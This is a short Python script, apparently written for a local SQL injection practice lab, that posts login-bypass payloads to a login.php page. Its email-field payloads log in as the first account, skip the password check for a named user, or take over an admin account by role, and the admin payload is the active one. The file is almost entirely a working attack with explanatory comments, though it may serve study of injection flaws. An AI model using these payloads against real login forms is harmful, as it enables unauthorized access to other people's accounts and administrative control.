import requests

# Bypass application logic: Bypass some of the application restriction.
# access to any account without username or password 

# Define the URL you want to send the GET request to
url = "http://localhost/sites/sql_injection/example1/login.php"

# access random account, it access the first account in the database based on its id
# mydata = {"submit":'ok','email':"' or 1=1 -- "}

#access any account without password
# mydata = {"submit":'ok','email':"bob@gmail.com' -- "}

# bypass code logic : access an admin account without password or username
mydata = {"submit":'ok','email':"' or (role='admin') -- "}


# Send the POST request and get the response
response = requests.post(url, data=mydata)

# Check the response status code
if response.status_code == 200:
    # The request was successful, access the response content
    print(response.text)
else:
    # The request failed, handle the error
    print(f"Error: {response.status_code}")
